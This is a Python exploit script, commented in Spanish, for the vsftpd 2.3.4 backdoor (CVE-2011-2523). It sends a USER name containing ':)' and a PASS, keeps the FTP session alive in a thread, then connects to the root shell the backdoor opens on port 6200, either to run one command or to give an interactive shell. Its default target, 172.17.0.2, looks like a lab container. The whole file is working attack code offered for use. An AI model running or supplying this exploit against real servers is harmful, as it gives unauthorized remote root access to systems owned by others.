#!/usr/bin/env python3
"""
CVE-2011-2523 — backdoor en vsftpd 2.3.4

La version 2.3.4 distribuida con alunas versiones de Debian/Ubuntu contiene
una puerta trasera en el manejo del comando USER: si el nombre de usuario
contiene la secuencia " :)" , el servidor lanza un shell interactivo que
escucha en el puerto 6200.

La sesion FTP debe permanecer ABIERTA mientras se conecta al 6200, por lo que
se mantiene en un hilo aparte.

Uso:
    python3 vsftpd_backdoor.py [-H IP] [-p 6200] [-c "comando"]
    python3 vsftpd_backdoor.py -i          # shell interactiva
"""
import argparse
import socket
import sys
import threading
import time

MAGIC = ":)"


def trigger_backdoor(host, port, keepalive=90, verbose=True):
    """Envia USER malicioso + PASS y mantiene viva la sesion FTP.

    El trigger exige DOS comandos: un USER cuyo nombre contenga ':)' (que no
    puede ser el primer caracter) seguido de un PASS. Es el PASS lo que
    dispara la apertura del shell en el 6200; el servidor deja de responder.
    """
    s = socket.create_connection((host, port), timeout=10)
    s.settimeout(10)
    banner = s.recv(1024).decode(errors="replace").strip()
    if verbose:
        print(f"[+] Banner FTP: {banner}", file=sys.stderr)
    s.sendall(f"USER backdoor{MAGIC}\r\n".encode())
    try:
        resp = s.recv(1024).decode(errors="replace").strip()
        if verbose:
            print(f"[+] Respuesta a USER malicioso: {resp}", file=sys.stderr)
    except socket.timeout:
        if verbose:
            print("[+] (sin respuesta al USER; normal en algunas builds)", file=sys.stderr)

    # El PASS es lo que arma el backdoor.
    s.sendall(b"PASS backdoor\r\n")
    try:
        resp = s.recv(1024).decode(errors="replace").strip()
        if verbose:
            print(f"[+] Respuesta a PASS: {resp}", file=sys.stderr)
    except socket.timeout:
        if verbose:
            print("[+] PASS sin respuesta: el servidor esta Lanzando el shell (comportamiento normal del backdoor)", file=sys.stderr)

    # La sesion debe seguir viva: es lo que mantiene el shell del 6200 abierto.
    def keep():
        end = time.time() + keepalive
        while time.time() < end:
            try:
                s.settimeout(5)
                s.recv(1024)
            except socket.timeout:
                pass
            except OSError:
                break

    t = threading.Thread(target=keep, daemon=True)
    t.start()
    return s, t


def backdoor_shell(host, port):
    """Conecta al shell del 6200 y devuelve el socket."""
    for i in range(20):
        try:
            c = socket.create_connection((host, port), timeout=8)
            c.settimeout(15)
            return c
        except (ConnectionRefusedError, OSError):
            if i == 0:
                print("[*] 6200 aun no escucha, reintentando...", file=sys.stderr)
            time.sleep(0.5)
    raise SystemExit("[-] No se pudo conectar al puerto 6200.")


def main():
    ap = argparse.ArgumentParser(description="Explot del backdoor de vsftpd 2.3.4 (CVE-2011-2523)")
    ap.add_argument("-H", "--host", default="172.17.0.2")
    ap.add_argument("-F", "--ftp-port", type=int, default=21)
    ap.add_argument("-p", "--shell-port", type=int, default=6200)
    ap.add_argument("-c", "--command", help="comando a ejecutar en el shell")
    ap.add_argument("-i", "--interactive", action="store_true", help="shell interactiva")
    args = ap.parse_args()

    print(f"[*] Objetivo {args.host}:{args.ftp_port} -> shell en :{args.shell_port}", file=sys.stderr)
    ftp_sock, _ = trigger_backdoor(args.host, args.ftp_port)

    print("[*] Conectando al shell del backdoor...", file=sys.stderr)
    c = backdoor_shell(args.host, args.shell_port)
    time.sleep(0.5)
    try:
        c.recv(1024)
    except socket.timeout:
        pass

    if args.command:
        c.sendall(args.command.encode() + b"\n")
        time.sleep(1.2)
        out = b""
        c.settimeout(3)
        try:
            while True:
                chunk = c.recv(4096)
                if not chunk:
                    break
                out += chunk
        except socket.timeout:
            pass
        sys.stdout.write(out.decode(errors="replace"))
        c.close()
        ftp_sock.close()
        return

    if args.interactive:
        import select
        c.sendall(b"id; whoami; hostname; echo '--- SHELL ROOT ---'\n")
        time.sleep(1)
        try:
            sys.stdout.write(c.recv(8192).decode(errors="replace"))
        except socket.timeout:
            pass
        print("[*] Escribe 'salir' para terminar.", file=sys.stderr)
        while True:
            try:
                r, _, _ = select.select([c, sys.stdin], [], [], 0.5)
            except Exception:
                break
            if c in r:
                try:
                    data = c.recv(4096)
                    if not data:
                        break
                    sys.stdout.write(data.decode(errors="replace"))
                    sys.stdout.flush()
                except OSError:
                    break
            if sys.stdin in r:
                line = sys.stdin.readline()
                if not line:
                    break
                if line.strip() in ("salir", "exit", "quit"):
                    c.sendall(b"exit\n")
                    break
                c.sendall(line.encode())
        c.close()
        ftp_sock.close()
        return

    c.close()
    ftp_sock.close()


if __name__ == "__main__":
    main()
